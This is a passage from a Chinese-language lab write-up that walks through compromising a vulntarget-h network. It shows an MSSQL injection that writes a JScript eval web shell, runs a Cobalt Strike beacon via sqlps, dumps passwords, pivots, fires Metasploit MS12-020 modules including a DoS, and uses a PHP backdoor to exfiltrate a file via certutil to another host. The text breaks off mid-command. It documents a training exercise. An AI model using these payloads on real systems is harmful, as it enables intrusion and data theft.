<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.99/index.aspx?user_id=1;</span><br><span class="line"><span class="built_in">declare</span> @f int,@g int;</span><br><span class="line"><span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;Scripting.FileSystemObject&#x27;</span>,@f output;</span><br><span class="line">EXEC SP_OAMETHOD @f,<span class="string">&#x27;CreateTextFile&#x27;</span>,@f OUTPUT,<span class="string">&#x27;c:\inetpub\edrfgyhujikopl\shell.aspx&#x27;</span>,1;</span><br><span class="line">EXEC sp_oamethod  @f,<span class="string">&#x27;WriteLine&#x27;</span>,null,<span class="string">&#x27;&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var a = &quot;un&quot;;var b = &quot;safe&quot;;Response.Write(eval(Request.Item[&quot;z&quot;],a%2Bb));%&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用蚁剑链接上我们刚才上传的shell。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-06-30_10-29-41.png" alt="Screenshot_2022-06-30_10-29-41.png"></p>
<h5 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h5><ul>
<li>使用CS生存木马然后免杀上传的服务器，然后利用<code>sqlps.exe</code>执行命令刚才上传的木马。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.99/?user_id=1;</span><br><span class="line"><span class="built_in">declare</span> @o int;</span><br><span class="line"><span class="built_in">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>,@o out;</span><br><span class="line"><span class="built_in">exec</span> sp_oamethod @o,<span class="string">&#x27;run&#x27;</span>,null,<span class="string">&#x27;sqlps C:\inetpub\edrfgyhujikopl\beacona.exe&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>上线成功。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-01_04-02-11.png" alt="Screenshot_2022-07-01_04-02-11.png"></p>
<blockquote>
<p>上面教程参考于：<a target="_blank" rel="noopener" href="https://macchiato.ink/web/web_security/mssql_bypass/#0x03-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">MSSQL注入绕过360执行命令</a></p>
</blockquote>
<ul>
<li>抓取Windows Server 2008密码。</li>
</ul>
<p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-01_04-07-48.png" alt="Screenshot_2022-07-01_04-07-48.png"></p>
<ul>
<li>开启代理移动到Windows 7。</li>
</ul>
</blockquote>
<h3 id="Windows-7"><a href="#Windows-7" class="headerlink" title="Windows 7"></a>Windows 7</h3><blockquote>
<p>由于本文章头开已经知道Windows 7的IP地址这里我就越过扫描192.168.153.0&#x2F;24这个网段。</p>
</blockquote>
<h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><ul>
<li>查看Windows 7开放的端口。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 nmap -sV 192.168.153.128              </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 05:56 EDT</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:53 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:1025 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:5900 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:554 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:113 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:1720 &lt;--denied</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:23869  ...  192.168.153.128:25 &lt;--denied</span><br><span class="line">...</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.153.128</span><br><span class="line">Host is up (1.1s latency).</span><br><span class="line">Not shown: 988 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">80/tcp    open  http               Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49152/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49158/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">Service Info: Host: WIN-HF4NQED9HKF; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1213.51 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>使用<code>nmap</code>扫描开放端口是否存在漏洞。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 nmap -sV 192.168.153.128 -p80,135,139,445,3389,5357,49152-49158 --script=vuln</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 02:13 EDT</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:445  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:3389  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:135  ...  OK</span><br><span class="line">...</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.153.128</span><br><span class="line">Host is up (1.6s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE  SERVICE        VERSION</span><br><span class="line">80/tcp    open   http           Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">135/tcp   open   msrpc?</span></span><br><span class="line"><span class="string">139/tcp   open   netbios-ssn?</span></span><br><span class="line"><span class="string">445/tcp   open   microsoft-ds?</span></span><br><span class="line"><span class="string">3389/tcp  open   ms-wbt-server?</span></span><br><span class="line"><span class="string">| rdp-vuln-ms12-020: </span></span><br><span class="line"><span class="string">|   VULNERABLE:</span></span><br><span class="line"><span class="string">|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2012-0152</span></span><br><span class="line"><span class="string">|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)</span></span><br><span class="line"><span class="string">|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     Disclosure date: 2012-03-13</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152</span></span><br><span class="line"><span class="string">|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability</span></span><br><span class="line"><span class="string">|     State: VULNERABLE</span></span><br><span class="line"><span class="string">|     IDs:  CVE:CVE-2012-0002</span></span><br><span class="line"><span class="string">|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)</span></span><br><span class="line"><span class="string">|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.</span></span><br><span class="line"><span class="string">|           </span></span><br><span class="line"><span class="string">|     Disclosure date: 2012-03-13</span></span><br><span class="line"><span class="string">|     References:</span></span><br><span class="line"><span class="string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002</span></span><br><span class="line"><span class="string">|_      http://technet.microsoft.com/en-us/security/bulletin/ms12-020</span></span><br><span class="line"><span class="string">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span></span><br><span class="line"><span class="string">5357/tcp  open   wsdapi?</span></span><br><span class="line"><span class="string">49152/tcp open   unknown</span></span><br><span class="line"><span class="string">49153/tcp open   unknown</span></span><br><span class="line"><span class="string">49154/tcp open   unknown</span></span><br><span class="line"><span class="string">49155/tcp open   unknown</span></span><br><span class="line"><span class="string">49156/tcp open   unknown</span></span><br><span class="line"><span class="string">49157/tcp closed unknown</span></span><br><span class="line"><span class="string">49158/tcp open   unknown</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Host script results:</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span></span><br><span class="line"><span class="string">|_smb-vuln-ms10-054: false</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 1188.52 seconds</span></span><br></pre></td></tr></table></figure>

<ul>
<li>通过上面的返回结果我们可以发现这里和Windows Server 2008有相同的漏洞，接下来我们就使用<code>msfconsole</code>的漏洞利用模块验证是否可以使用。</li>
</ul>
<blockquote>
<p>CVE-2012-0152</p>
<p>CVE-2012-0002</p>
<ul>
<li>这里一共搜索到两个模块。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 msfconsole                                                                   </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">msf6 &gt; search ms12-020</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                              Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                              ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/scanner/rdp/ms12_020_check                               normal  Yes    MS12-020 Microsoft Remote Desktop Checker</span><br><span class="line">   1  auxiliary/dos/windows/rdp/ms12_020_maxchannelids  2012-03-16       normal  No     MS12-020 Microsoft Remote Desktop Use-After-Free DoS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 1, use 1 or use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br></pre></td></tr></table></figure>

<p>使用<code>auxiliary/scanner/rdp/ms12_020_check</code>模块。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; <span class="built_in">set</span> rhosts 192.168.153.128</span><br><span class="line">rhosts =&gt; 192.168.153.128</span><br><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; exploit </span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:3389  ...  OK</span><br><span class="line"></span><br><span class="line">[+] 192.168.153.128:3389  - 192.168.153.128:3389 - The target is vulnerable.</span><br><span class="line">[*] 192.168.153.128:3389  - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>这里显示<strong>The target is vulnerable.（目标很脆弱。）</strong>，但是我找到该漏洞的exp并不能对目标造成影响。接下来我们继续尝试另外一个模块。</p>
<p>使用<code>auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code>模块。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/rdp/ms12_020_check) &gt; use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line">msf6 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; <span class="built_in">set</span> rhosts 192.168.153.128</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">rhosts =&gt; 192.168.153.128</span><br><span class="line">msf6 auxiliary(dos/windows/rdp/ms12_020_maxchannelids) &gt; exploit </span><br><span class="line">[*] Running module against 192.168.153.128</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:3389  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:3389  ...  OK</span><br><span class="line"></span><br><span class="line">[*] 192.168.153.128:3389 - 192.168.153.128:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS</span><br><span class="line">[*] 192.168.153.128:3389 - 192.168.153.128:3389 - 210 bytes sent</span><br><span class="line">[*] 192.168.153.128:3389 - 192.168.153.128:3389 - Checking RDP status...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:3389  ...  OK</span><br><span class="line">[-] 192.168.153.128:3389 - 192.168.153.128:3389 - RDP Service Unreachable</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>该模块也不能正常运行。接下来只能尝试其他端口。</p>
</blockquote>
<ul>
<li>使用<code>nikto</code>。并没有发现特别的信息。只能用浏览器打开看看能不能找到有用的数据了。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 nikto -host http://192.168.153.128</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">+ Target IP:          192.168.153.128</span><br><span class="line">+ Target Hostname:    192.168.153.128</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2022-07-02 02:33:39 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">+ Retrieved x-powered-by header: PHP/7.3.4</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause <span class="literal">false</span> positives.</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">- STATUS: Completed 3190 requests (~46% complete, 16.6 minutes left): currently <span class="keyword">in</span> plugin <span class="string">&#x27;Nikto Tests&#x27;</span></span><br><span class="line">- STATUS: Running average: 100 requests: 0.22830 sec, 10 requests: 0.1804 sec.</span><br><span class="line">+ Scan terminated:  12 error(s) and 7 item(s) reported on remote host</span><br><span class="line">+ End Time:           2022-07-02 03:13:08 (GMT-4) (2369 seconds)</span><br></pre></td></tr></table></figure>

<h4 id="上传木马"><a href="#上传木马" class="headerlink" title="上传木马"></a>上传木马</h4><ul>
<li>使用浏览器查看网页是否有对我们有用的信息。(需要把火狐浏览器代理模式设置成系统代理)</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 firefox 192.168.153.128</span><br></pre></td></tr></table></figure>

<p><img src="/../images/vulntarget-h%20write-up/%E6%88%AA%E5%9B%BE_2022-07-02_15-08-05.png" alt="截图_2022-07-02_15-08-05.png"></p>
<ul>
<li><p>从上面的返回的结果我们可以看到这是需要我们通过命令注入查看<code>c:\phpstudy_pro\COM\a.txt</code>文件的内容。由于这里使用<code>exec</code>函数并没有返回数据。</p>
</li>
<li><p>我们先尝试能不能在当前目录写入文件。发现并不可以。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.128 -d <span class="string">&quot;shell=echo &#x27;&lt;?php phpinfo();?&gt;&#x27;&gt;l.php&quot;</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">&lt;code&gt;&lt;span style=<span class="string">&quot;color: #000000&quot;</span>&gt;</span><br><span class="line">&lt;br /&gt;&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="built_in">exec</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;</span>color: <span class="comment">#0000BB&quot;&gt;?&gt;&lt;/span&gt;小子留下了一个后门，读一下c:\phpstudy_pro\COM\a.txt吧里面有好东西</span></span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;         </span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.128/l.php                                     </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;404 错误 - phpstudy&lt;/title&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">...</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>接下来只能尝试使用<code>certutil</code>请求Windows Server 2008的开放的80端口（由于Windows 7不出网Windows Sever 2008刚好开放了80端口我们又有Windows Server 2008的权限，我们可以通过查看Windows Server 2008的IIS请求日志）。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Downloads]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.128 -d <span class="string">&quot;shell=for /f %i in (&#x27;type c:\phpstudy_pro\COM\a.txt&#x27;) do certutil -urlcache  -split -f http://192.168.153.130/aaa/%i&quot;</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.128:80  ...  OK</span><br><span class="line">&lt;code&gt;&lt;span style=<span class="string">&quot;color: #000000&quot;</span>&gt;</span><br><span class="line">&lt;br /&gt;&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="built_in">exec</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #0000BB&quot;</span>&gt;<span class="variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="string">&quot;color: #007&lt;br /&gt;&lt;/span&gt;&lt;span style=&quot;</span>color: <span class="comment">#0000BB&quot;&gt;?&gt;&lt;/span&gt;小子留下了一个后门，读一下c:\phpstudy_pro\COM\a.txt吧里面有好东西</span></span><br><span class="line">&lt;/span&gt;</span><br><span class="line">&lt;/code&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>查看IIS请求日志（日志文件里面的数据可能会存在延迟）。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> C:\inetpub\logs\LogFiles\W3SVC1\</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> C:\inetpub\logs\LogFiles\W3SVC1\</span><br><span class="line">[+] host called home, sent: 67 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 DCD2-557A</span><br><span class="line"></span><br><span class="line"> C:\inetpub\logs\LogFiles\W3SVC1 的目录</span><br><span class="line"></span><br><span class="line">2022/07/02  12:48    &lt;DIR&gt;          .</span><br><span class="line">2022/07/02  12:48    &lt;DIR&gt;          ..</span><br><span class="line">2022/03/29  10:21               999 u_ex220329.log</span><br><span class="line">2022/07/02  18:10            16,728 u_ex220702.log</span><br><span class="line">               2 个文件         17,727 字节</span><br><span class="line">               2 个目录 24,780,013,568 可用字节</span><br><span class="line"></span><br><span class="line">beacon&gt; shell <span class="built_in">type</span> C:\inetpub\logs\LogFiles\W3SVC1\u_ex220702.log</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">type</span> 